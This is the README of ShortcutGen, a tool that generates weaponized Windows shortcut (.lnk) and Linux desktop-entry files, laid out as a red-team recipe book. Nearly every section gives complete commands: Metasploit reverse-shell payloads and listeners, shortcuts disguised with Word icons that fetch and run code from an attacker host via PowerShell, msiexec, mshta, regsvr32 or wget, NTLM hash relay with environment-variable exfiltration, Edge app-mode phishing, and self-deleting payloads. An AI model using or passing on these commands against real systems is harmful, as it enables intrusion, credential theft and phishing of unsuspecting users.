# ShortcutGen

**ShortcutGen (short for Shortcut Generator)** is a script that generates shortcut files as weaponized payloads. Ever since [lnk2pwn](https://github.com/it-gorillaz/lnk2pwn) was at it's prime to generate windows shortcut (`.lnk`) files. However, security vendors were able to trigger the static signature as malicious due to it's outdated library. [MisterioLNK](https://github.com/K3rnel-Dev/MisterioLNK) exists but it's designed to work in the Windows operating system. I knew I needed something to get away from it to keep everything mobile in the Linux workspace. Providentially, all thanks to Microsoft for releasing [PowerShell](https://github.com/PowerShell/PowerShell) and `wine` are the solution to this problem. In addition, another attack vector for targeting Linux desktops is the desktop entry (`.desktop`).

## Installation

Run the installer. It'll install the required dependencies.

```
$ bash -c "$(curl --proto '=https' --tlsv1.2 -sSfL "https://raw.githubusercontent.com/U53RW4R3/ShortcutGen/master/install.sh")"

$ bash -c "$(wget -qO - "https://raw.githubusercontent.com/U53RW4R3/ShortcutGen/master/install.sh")"
```

## Help Menu

```
$ shortcutgen -h
Usage: shortcutgen [flags] -o <output>
Flags:
    -p, --payload                       Specify a payload module ('lnk', 'desktop').
    -c, --command                       Specify a command to execute.
    -a, --arguments                     Optionally pass the arguments (except it is
                                        mandatory for 'lnk' payload module).
    -i, --ip                            Specify an IP address/hostname (applies with
                                        'lnk' payload module).
    -e, --environment                   Optionally pass the environment variables to
                                        exfiltrate.
    -s, --share                         Specify an SMB share (applies with -h flag
                                        when it's optional for 'lnk' payload module).
    -n, --name                          Specify a name. It is optional when 'lnk'
                                        payload module is specified (applies with -h flag).
                                        For 'desktop' payload module it is mandatory.
    -d, --description                   Specify the description of the payload.
    --icon                              Specify a custom icon.
    -w, --window                        Specify a window. For 'lnk' payload windowstyle
                                        'normal' is set by default if not specified.
                                        The available windowstyles are: 'normal', 'maximized',
                                        and 'minimized'. For 'desktop' payload it is set to
                                        'false', the available options are: 'true' and 'false'.
    --workingdirectory                  Specify a working directory.
    -o, --output                        Specify an output.
    -v, --version                       Display the program's version number.
    -h, --help                          Display the help menu.
```

## Usage

### 0x00 - Trojanized Shortcuts

#### Windows

Generate the shell link then pack it with the PE EXEcutable dropper (`.exe`) payload to trigger it. For a custom icon (`--icon`) you must either specify an index or an absolute path of the file/executable with a suffix of zero (e.g., `C:\path\to\file,0`) otherwise it won't generate and result an error. The working directory (`--workingdirectory`) will be executed if you placed a dropper that touches the disk unless you're staging it so be careful with this option.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o payload.exe

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 443; run"

$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c .\payload.exe" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk

$ 7z a -tzip -mx=9 archive.zip payload.*
```

Generate the shell link then pack it with the Dynamic Link Library dropper (`.dll`) payload to trigger it.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f dll -o payload.dll

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 443; run"

$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c rundll32.exe .\payload.dll,StartW" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk

$ 7z a -tzip -mx=9 archive.zip payload.*
```

Generate the shell link while hosting a webserver to stage a PowerShell (`.ps1`) payload to trigger it.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh-reflection -o payload.ps1

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; exploit"

$ sudo python -m http.server 80

$ shortcutgen -p lnk -c ""C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe"" -a "-nop -NonI -Nologo -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http[s]://<attacker_IP>/payload.ps1'))\"" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
```

Generate the shell link while hosting a webserver to stage a MSI installer (`.msi`) payload to trigger it.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o payload.msi

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"

$ sudo python -m http.server 80

$ shortcutgen -p lnk -c "C:\Windows\System32\msiexec.exe" -a "/quiet /qn /i http://<attacker_IP>/payload.msi" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
```

Generate the shell link then automatically hosting a staging HTA payload (`.hta`) using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.

```
$ sudo msfconsole -qx "use exploit/windows/misc/hta_server; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvhost <server_IP>; set srvport <server_PORT> exploit"

$ shortcutgen -p lnk -c "C:\Windows\System32\mshta.exe" -a "http[s]://<attacker_IP>/payload.hta" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\Users\Public\" -o payload.lnk
```

Generate the shell link then automatically hosting a staging DLL payload (`.dll`) using `metasploit-framework` exploit module `exploit/windows/smb/smb_delivery`.

```
$ sudo msfconsole -qx "use exploit/windows/smb/smb_delivery; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set file_name payload.dll; set share staging; exploit"

$ shortcutgen -p lnk -c "C:\Windows\System32\rundll32.exe" -a "\\<attacker_IP>\staging\payload.dll,0" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
```

Generate the shell link then automatically hosting a staging scriptlet payload (`.sct`) using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 3; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; exploit"

$ shortcutgen -p lnk -c "C:\Windows\System32\regsvr32.exe" -a "/s /n /u /i://http://<attacker_IP>:<attacker_PORT>/payload.sct scrobj.dll" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
```

#### Linux

Generate the desktop entry then automatically hosting a python payload (`.py`) using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 0; set payload python/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; exploit"

$ shortcutgen -p desktop -n "Document File" -c "python" -a "\"<payload>\"" --icon "libreoffice-writer" --workingdirectory "/tmp/" -w "false" -o payload.desktop
```

Generate the desktop entry then automatically hosting an ELF payload using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 7; set payload linux/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; exploit"

$ shortcutgen -p desktop -n "Document File" -c "wget" -a "wget -qO payload --no-check-certificate http://192.168.1.4/payload; chmod +x payload; ./payload& disown" --icon "libreoffice-writer" --workingdirectory "/tmp/" -w "false" -o payload.desktop
```

### 0x01 - Relay NTLM Hash

Specify the attacker's IP address.

```
$ shortcutgen -p lnk -i "192.168.1.4" -s "Documents" -n "document.docx" -o payload.lnk
```

Even a rouge hostname can trigger the DNS.

```
$ shortcutgen -p lnk -i "fileserver" -s "Documents" -n "document.docx" -o payload.lnk
```

To exfiltrate environment variables.

```
$ shortcutgen -p lnk -i "fileserver" -e "COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS" -s "Documents" -n "document.docx" -w "minimized" -o payload.lnk
```

### 0x02 - Phishing

You can send a targeted phishing campaign using chromium-based web browsers in application mode from [mrd0x's blog post](https://mrd0x.com/phishing-with-chromium-application-mode/).

```
$ shortcutgen -p lnk -c "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -a "--app=http://192.168.1.4" --icon "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,0" -o Office365.lnk
```

### 0x03 - Defense Evasion

#### Anti-Forensics

You can of course self delete the payload after execution.

```
$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c mshta.exe http[s]://<attacker_IP>/payload.hta & del %CD%\payload.lnk" --icon "C:\path\to" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
```

Including `.desktop` file.

```
$ shortcutgen -p desktop -n "Document File" -c "wget" -a "wget -qO payload --no-check-certificate http://192.168.1.4/payload; chmod +x payload; ./payload& disown;sleep 2; rm \$(pwd)/payload.desktop" --workingdirectory "/tmp/" -w "false" -o payload.desktop
```

## Limitations

- The **HotKey** has not been implemented in `wine` so I can't make a feature for persistence. So much potential with this shortcut is gone :(

- A minor limitation that `wine` lacks choosing file formats as custom icons.

- Creating polyglot is not possible with `wine`'s own `copy` command. Only Windows native `copy` command works.

## FAQ (Frequent Asked Questions)

### Why didn't you use [pylnk](https://github.com/strayge/pylnk) library?

I could but I decided to implement a wrapper with `wine` which is much more suitable in a long term. Saves me a lot of trouble from reinventing my own library in case it gets abandoned. It's often best to explore more options to produce similar results.

### I want to understand how the Windows shell link works. Is there a technical whitepaper that does help me to make my own library?

The official Microsoft's own **MS-SHLLINK binary file format** can found [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943?redirectedfrom=MSDN).

### Can I use the techniques for my project or other tradecraft for my own arsenal?

It is highly encouraged of you to understand how the shortcut generator is being processed then outputted. The GNU GPLv3 copyleft license grants you the right to inspect the source code, modify it to your needs, and redistribute with your own copy along with the source code.

## Troubleshooting

### Uninstall

To uninstall the programs.

```
$ sudo rm -f ~/.wine/ /usr/local/src/shortcutgen.sh /usr/local/bin/shortcutgen
```

## References

- [\[MS-SHLLINK\]: Shell Link (.LNK) Binary File Format](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943?redirectedfrom=MSDN)

- [Exiftool: LNK Tags](https://exiftool.org/TagNames/LNK.html)

- [lnk2pwn](https://github.com/it-gorillaz/lnk2pwn)

- [MisterioLNK](https://github.com/K3rnel-Dev/MisterioLNK)

- [LNKUp](https://github.com/Plazmaz/LNKUp)

- [pylnk](https://github.com/strayge/pylnk)

- [mslinks](https://github.com/vatbub/mslinks)

## Credits

- [tommelo](https://github.com/tommelo)

## Disclaimer

It is your responsibility depending on whatever the cause of your actions user. Remember that with great power comes great responsibility.
